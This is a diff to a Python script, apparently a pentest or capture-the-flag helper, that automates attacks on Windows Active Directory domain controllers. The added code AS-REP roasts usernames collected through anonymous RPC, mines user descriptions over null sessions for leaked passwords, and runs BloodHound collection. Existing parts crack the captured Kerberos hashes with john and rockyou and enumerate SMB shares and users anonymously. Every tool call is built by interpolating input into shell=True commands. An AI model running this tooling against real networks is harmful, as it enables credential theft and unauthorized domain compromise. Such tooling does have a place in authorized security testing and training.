@@ -25,7 +25,7 @@ parser.add_argument("-r", "--RHOST", action="store", help="RHOST, -r 10.10.10.1 
 parser.add_argument("-u", "--USERNAME", action="store", help="Username")
 parser.add_argument("-p", "--PASSWORD", action="store", help="Password")
 parser.add_argument("-I", "--IMPACKET", action="store_true", help="Run Impacket")
-parser.add_argument("-C", "--CRACK", action="store_true", help="Run Crackmapexec")
+parser.add_argument("-B", "--BLOOD", action="store_true", help="Run Crackmapexec")
 args = parser.parse_args()
 parser.parse_args(args=None if sys.argv[1:] else ['--help'])
 
@@ -33,7 +33,7 @@ RHOST = args.RHOST
 USERNAME = args.USERNAME
 PASSWORD = args.PASSWORD
 IMP = args.IMPACKET
-CRACK = args.CRACK
+BLOOD = args.BLOOD
 
 def D():
     print(f"{YELLOW}Getting Domain Name and saving to domain_name.txt{RESET}")
@@ -144,7 +144,7 @@ def LDAP():
                 else:
                     print(f"\n{YELLOW}LDAP NULL session did not work{RESET}")
 
-def ASREP():
+def ASREPLDAP():
     with open("domain_name.txt", "r") as f:
         content = f.read()
         answer = input(f"\n{MAGENTA}Please put Domain Name in /etc/hosts, press enter to continue Domain name is {RED}{content}{MAGENTA} with IP of {RED}{RHOST}\n")
@@ -158,6 +158,19 @@ def ASREP():
             else:
                 os.remove("asrep_hash.txt")
 
+def ASREPRPC():
+    with open("domain_name.txt", "r") as f:
+        content = f.read()
+        answer = input(f"\n{MAGENTA}Please put Domain Name in /etc/hosts, press enter to continue Domain name is {RED}{content}{MAGENTA} with IP of {RED}{RHOST}\n")
+        s = Popen([f"GetNPUsers.py '{content}/' -usersfile rpc_users.txt -no-pass -dc-ip {RHOST} > asrep_hash.txt"], shell=True)
+        s.wait()
+        with open("asrep_hash.txt", "r") as f:
+            content = f.read()
+            word = "krb5asrep"
+            if word in content:
+                print(f"{MAGENTA}*****{YELLOW}AsRepRoasting{YELLOW}{MAGENTA} looks like it worked*****{RESET}")
+            else:
+                os.remove("asrep_hash.txt")
 def CRACK():
     with open("asrep_hash.txt", "r") as f:
         s = Popen([f"john asrep_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep --fork=4 > 1.txt"], shell=True)
@@ -259,6 +272,24 @@ def RPC():
                         content = f.read()
                         print (content)
 
+def RPCDES():
+    print(f"{YELLOW}Running against rpc_users.txt file{RESET}")
+    with open ("rpc_users.txt") as f:
+        line = f.readline()
+        cnt = 0
+        while line:
+            s = Popen([f'rpcclient -U "" -N -c "queryuser {line}" {RHOST} >> rpc_des.txt'], shell=True)
+            s.wait()
+            cnt += 1
+            line = f.readline()
+            print("rpc_des.txt")
+    with open ("rpc_des.txt", "r") as f:
+        content = "Description"
+        file = f.read()
+        if content in file:
+            s = Popen([f'cat rpc_des.txt | grep -i Description'], shell=True)
+            s.wait()
+
 def SMBANONCRACK():
     s = Popen([f"nxc smb {RHOST} -u '' -p '' --shares --users --groups >> smb_anon.txt"], shell=True)
     s.wait()
@@ -357,20 +388,38 @@ if USERNAME is None and PASSWORD is None:
         check = input(f"\n{RED}Try and dump users, groups and shares (y/n){RESET}\n")
         if check == "y":
             SMBANONCRACK()
-    LDAP()
-    path = './usernames.txt'
+    RPC()
+    path = './rpc_users.txt'
     check_file = os.path.isfile(path)
     if check_file == True:
-        check = input(f"\n{RED}Would you like to try AsRepRoasting (y/n){RESET}\n")
+        check = input(f"\n{RED}Would you like to try AsRepRoasting against users found in RPC (y/n){RESET}\n")
         if check == "y":
-            ASREP()
+            ASREPRPC()
             path = './asrep_hash.txt'
             check_file = os.path.isfile(path)
             if check_file == True:
                 check = input(f"\n{RED}Would you like to try and crack the hashes (y/n){RESET}\n")      
                 if check == "y":
                     CRACK()
-    RPC()
+    path = './rpc_users.txt'
+    check_file = os.path.isfile(path)
+    if check_file == True:
+        check = input(f"{RED}Would you like to look at descriptions for RPC, this can take a while especially on a large network (y/n) \n{RESET}")
+        if check == "y":
+            RPCDES()
+    LDAP()
+    path = './usernames.txt'
+    check_file = os.path.isfile(path)
+    if check_file == True:
+        check = input(f"\n{RED}Would you like to try AsRepRoasting against users found in LDAP (y/n){RESET}\n")
+        if check == "y":
+            ASREPLDAP()
+            path = './asrep_hash.txt'
+            check_file = os.path.isfile(path)
+            if check_file == True:
+                check = input(f"\n{RED}Would you like to try and crack the hashes (y/n){RESET}\n")      
+                if check == "y":
+                    CRACK()
     exit()
 
 if USERNAME is not False and PASSWORD is not False:
@@ -396,12 +445,26 @@ if USERNAME is not False and PASSWORD is not False:
     SPNWUP()
     SIDWUP()
 
+if BLOOD == True:
+    print(f"{YELLOW}Running bloodhound as user {RED}{USERNAME}{YELLOW} with password {RED}{PASSWORD}{RESET}")
+    path = 'Blood'
+    check_path = os.path.isdir(path)
+    if check_path == True:
+        os.chdir(path)
+    else:
+        os.mkdir(path)
+        os.chdir(path)
+    with open("../domain_name.txt", "r") as f:
+        content = f.read()
+    s = Popen([f"bloodhound-python -d {content} -u {USERNAME} -p {PASSWORD} -c all -ns {RHOST}"], shell=True)
+    s.wait()
+
 if IMP == True:
     D()
     path = './ker_users.txt'
     check_file = os.path.isfile(path)
     if check_file == True:
-        check = input(f"\n{RED}Would you like to try Kerberoasting for Serive Accounts (y/n)\n{RESET}")
+        check = input(f"\n{RED}Would you like to try Kerberoasting for Service Accounts (y/n)\n{RESET}")
         if check == "y":
             SPN()
             path = './hash.txt'
